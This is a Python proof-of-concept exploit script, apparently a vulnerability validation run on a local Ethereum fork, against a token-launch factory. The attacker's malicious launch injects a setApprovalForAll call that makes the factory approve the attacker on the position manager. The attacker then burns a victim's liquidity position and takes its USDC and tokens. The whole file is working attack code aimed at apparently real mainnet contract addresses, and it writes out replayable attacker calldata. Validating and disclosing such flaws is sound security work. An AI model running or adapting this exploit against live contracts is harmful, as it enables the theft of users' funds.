#!/usr/bin/env python3
"""End-to-end validation on anvil fork @26201639:
  1) victim launches Pigcon' with the replay calldata (fresh salt)
  2) fresh attacker injects setApprovalForAll via a malicious launch
  3) attacker sweeps the victim position (BURN_POSITION + TAKE_PAIR)
"""
import json
import secrets
import time
import urllib.request

from eth_abi import encode, decode
from eth_utils import keccak, to_checksum_address

RPC = "http://127.0.0.1:8555"
FACTORY = "0xFB60CD0B36aD4bD839b91767a6Ad9055AB6aD825"
POSM = "0xbD216513d74C8cf14cf4747E6AaA6420FF64ee9e"
WETH = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2"
USDC = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"
VICTIM = to_checksum_address("0x0000000000000000000000000000000000002222")
ATTACKER = to_checksum_address("0x0000000000000000000000000000000000001111")

_id = [0]


def rpc(method, *params):
    _id[0] += 1
    req = {"jsonrpc": "2.0", "id": _id[0], "method": method, "params": list(params)}
    body = json.dumps(req).encode()
    r = urllib.request.Request(RPC, data=body, headers={"Content-Type": "application/json"})
    with urllib.request.urlopen(r, timeout=120) as resp:
        out = json.load(resp)
    if "error" in out:
        raise RuntimeError(f"{method} error: {out['error']}")
    return out["result"]


def eth_call(to, data, frm=None, value=0):
    tx = {"to": to, "data": data}
    if frm:
        tx["from"] = frm
    if value:
        tx["value"] = hex(value)
    return rpc("eth_call", tx, "latest")


def send_tx(frm, to, data, value=0):
    tx = {"from": frm, "to": to, "data": data, "value": hex(value)}
    txh = rpc("eth_sendTransaction", tx)
    for _ in range(200):
        rc = rpc("eth_getTransactionReceipt", txh)
        if rc:
            if rc["status"] != "0x1":
                raise RuntimeError(f"tx reverted: {txh}")
            return txh, rc
        time.sleep(0.2)
    raise RuntimeError("receipt timeout")


def sel(sig):
    return "0x" + keccak(text=sig)[:4].hex()


def erc20_balance(token, who):
    return int(eth_call(token, sel("balanceOf(address)") + encode(["address"], [who]).hex()), 16)


def owner_of(tid):
    return eth_call(POSM, sel("ownerOf(uint256)") + encode(["uint256"], [tid]).hex())


def is_approved_for_all(owner, operator):
    data = sel("isApprovedForAll(address,address)") + encode(["address", "address"], [owner, operator]).hex()
    return int(eth_call(POSM, data), 16) == 1


def main():
    results = {"victim": VICTIM, "attacker": ATTACKER}

    # fund both actors
    for a in (VICTIM, ATTACKER):
        rpc("anvil_setBalance", a, hex(100 * 10**18))
        rpc("anvil_impersonateAccount", a)

    # ---- 1) VICTIM LAUNCH ----
    replay = json.load(open("pigcon_replay.json"))
    calldata = open("pigcon_replay_calldata.hex").read().strip()
    victim_token = replay["predictedToken"]
    tid_before = int(eth_call(POSM, sel("nextTokenId()")), 16)
    txh, rc = send_tx(VICTIM, FACTORY, calldata, value=int(replay["value_wei"]))
    tid_after = int(eth_call(POSM, sel("nextTokenId()")), 16)
    new_id = tid_before  # position minted with the pre-call nextTokenId
    results["victimLaunch"] = {
        "txHash": txh, "gasUsed": int(rc["gasUsed"], 16), "positionTokenId": new_id,
        "token": victim_token,
        "ownerOfCheck": owner_of(new_id) if tid_after > tid_before else None,
    }
    print(f"[1] victim launch OK  tx={txh}  gas={int(rc['gasUsed'],16)}  newToken={victim_token}  positionId={new_id}")
    print(f"    POSM.ownerOf({new_id}) = {results['victimLaunch']['ownerOfCheck']}")

    # ---- 2) FRESH ATTACKER: malicious launch injecting setApprovalForAll ----
    salt2 = secrets.token_bytes(32)
    evil_token_raw = rpc("eth_call", {"to": FACTORY, "data": sel("predict(bytes32)") + salt2.hex()}, "latest")
    evil_token = to_checksum_address("0x" + evil_token_raw[-40:])
    c0, c1 = (WETH, evil_token) if int(WETH, 16) < int(evil_token, 16) else (evil_token, WETH)
    init2 = sel("initializePool((address,address,uint24,int24,address),uint160)") + encode(
        ["address", "address", "uint24", "int24", "address", "uint160"],
        [c0, c1, 10000, 200, "0x" + "00" * 20, 2**96]).hex()
    modify2 = sel("setApprovalForAll(address,bool)") + encode(["address", "bool"], [ATTACKER, True]).hex()
    params_enc = encode(
        ["string", "string", "uint256", "address", "uint256", "bytes32", "string", "string", "string", "string", "bool"],
        ["evil", "EVIL", 10**24, WETH, 10**24, salt2, "", "", "", "", False])
    sb_enc = encode(["address", "uint256", "bytes", "bytes[]", "uint128[]", "address[]"],
                    [WETH, 0, b"", [], [], []])
    init_b = bytes.fromhex(init2[2:])
    mod_b = bytes.fromhex(modify2[2:])
    def encb(x):
        return (len(x)).to_bytes(32, "big") + x + b"\x00" * ((32 - len(x) % 32) % 32)
    init_s = encb(init_b); mod_s = encb(mod_b)
    o1 = 128; o2 = o1 + len(params_enc); o3 = o2 + len(init_s); o4 = o3 + len(mod_s)
    data2 = sel("launch((string,string,uint256,address,uint256,bytes32,string,string,string,string,bool),bytes,bytes,(address,uint256,bytes,bytes[],uint128[],address[]))") + (
        o1.to_bytes(32, "big") + o2.to_bytes(32, "big") + o3.to_bytes(32, "big") + o4.to_bytes(32, "big")
    ).hex() + params_enc.hex() + init_s.hex() + mod_s.hex() + sb_enc.hex()

    txh2, rc2 = send_tx(ATTACKER, FACTORY, data2, value=0)
    approved = is_approved_for_all(FACTORY, ATTACKER)
    results["attackerLaunch"] = {
        "txHash": txh2, "evilToken": evil_token, "salt": "0x" + salt2.hex(),
        "approvalGranted": approved, "value": "0",
    }
    print(f"[2] attacker malicious launch OK  tx={txh2}  evilToken={evil_token}")
    print(f"    POSM.isApprovedForAll(factory, attacker) = {approved}")
    assert approved, "approval injection failed"

    # ---- 3) SWEEP: BURN_POSITION + TAKE_PAIR ----
    burn = encode(["uint256", "uint128", "uint128", "bytes"], [new_id, 0, 0, b""])
    take = encode(["address", "address", "address"], [USDC, victim_token, ATTACKER])
    unlock = encode(["bytes", "bytes[]"], [bytes([0x03, 0x11]), [burn, take]])
    sweep_data = sel("modifyLiquidities(bytes,uint256)") + encode(["bytes", "uint256"], [unlock, 4102444800]).hex()

    usdc_before = erc20_balance(USDC, ATTACKER)
    tok_before = erc20_balance(victim_token, ATTACKER)
    txh3, rc3 = send_tx(ATTACKER, POSM, sweep_data, value=0)
    usdc_got = erc20_balance(USDC, ATTACKER) - usdc_before
    tok_got = erc20_balance(victim_token, ATTACKER) - tok_before
    burned = False
    try:
        owner_of(new_id)
    except RuntimeError:
        burned = True
    factory_posm_bal = int(eth_call(POSM, sel("balanceOf(address)") + encode(["address"], [FACTORY]).hex()), 16)
    results["sweep"] = {
        "txHash": txh3, "gasUsed": int(rc3["gasUsed"], 16), "positionBurned": burned,
        "attackerReceivedUSDC": str(usdc_got), "attackerReceivedToken": str(tok_got),
        "factoryPOSMBalanceAfter": factory_posm_bal,
    }
    print(f"[3] sweep OK  tx={txh3}  gas={int(rc3['gasUsed'],16)}")
    print(f"    position burned: {burned}")
    print(f"    attacker received USDC = {usdc_got}  ({usdc_got/1e6:.2f} USDC)")
    print(f"    attacker received {replay['params']['symbol']} = {tok_got}  ({tok_got/1e18:.4f} tokens)")
    print(f"    factory POSM balance (positions) = {factory_posm_bal}")

    json.dump(results, open("e2e_results.json", "w"), indent=2)
    json.dump({"evilLaunchSalt": "0x" + salt2.hex(), "evilLaunchCalldata": data2,
               "sweepCalldata": sweep_data, "sweepActions": "0x0311",
               "positionTokenId": new_id, "victimToken": victim_token},
              open("attacker_replay.json", "w"), indent=2)
    print("\nwrote e2e_results.json and attacker_replay.json")


if __name__ == "__main__":
    main()
